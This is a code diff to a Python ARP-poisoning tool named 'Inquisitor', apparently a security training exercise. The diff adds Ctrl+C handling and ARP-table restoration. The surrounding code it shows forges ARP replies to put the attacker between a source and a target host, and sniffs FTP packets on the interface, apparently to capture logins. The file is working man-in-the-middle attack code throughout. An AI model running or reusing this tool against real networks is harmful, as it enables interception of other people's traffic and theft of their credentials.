@@ -3,6 +3,7 @@
 
 import argparse
 import re
+import signal
 import sys
 import threading
 import time
@@ -12,10 +13,17 @@ SRC_IP = None
 TARGET_IP = None
 SRC_MAC = None
 TARGET_MAC = None
-RUNNING = True
 DELAY = 2
 INTERFACE = "eth0"
 VERBOSE = False
+
+def signal_handler(sig, frame):
+    global RUNNING
+    RUNNING = False
+
+    print("\nCTRL+C detected. Restoring ARP tables...")
+    restore_arp()
+    RUNNING = False
 
 def is_valid_ip(ip):
     # Regex pour valider une adresse IPv4
@@ -42,13 +50,14 @@ def packet_parser(packet):
 
 def sniff_ftp_packets():
 
-    print(f"Listening for FTP packets in {INTERFACE}...")
+    print(f"Listening for FTP packets in {INTERFACE}...", end=' ')
     while RUNNING:
         if INTERFACE:
             sniff(prn=packet_parser, timeout=2, store=0, iface=INTERFACE)
         else:
             print("Unable to determine bridge interface name.")
             break
+    print("Finish")
 
 def restore_arp():
     packet_target = ARP(op=2, pdst=TARGET_IP, hwdst=TARGET_MAC, psrc=SRC_IP, hwsrc=SRC_MAC)
@@ -60,7 +69,6 @@ def restore_arp():
     print(f"Restauration de l'ARP pour la source {SRC_IP}.")
 
 def main_loop():
-
     while RUNNING:
         try:
             arp_response_target = ARP(pdst=TARGET_IP, hwdst=TARGET_MAC, psrc=SRC_IP, op='is-at')
@@ -73,6 +81,10 @@ def main_loop():
     
 
 if __name__ == "__main__":
+    global RUNNING
+    RUNNING = True
+    signal.signal(signal.SIGINT, signal_handler)
+
     parser = argparse.ArgumentParser(description="Inquisitor ARP Poisoning Tool")
 
     parser.add_argument("--src-ip", required=True, help="Source IP address")
@@ -93,9 +105,6 @@ if __name__ == "__main__":
 
     try:
         sniff_ftp_packets()
-    except KeyboardInterrupt:
-        print("\nCTRL+C detected. Restoring ARP tables...")
-
-    restore_arp()
-    RUNNING = False
-    thread.join()   #waiting thread finish
+    finally:
+        RUNNING = False
+        thread.join()   #waiting thread finish
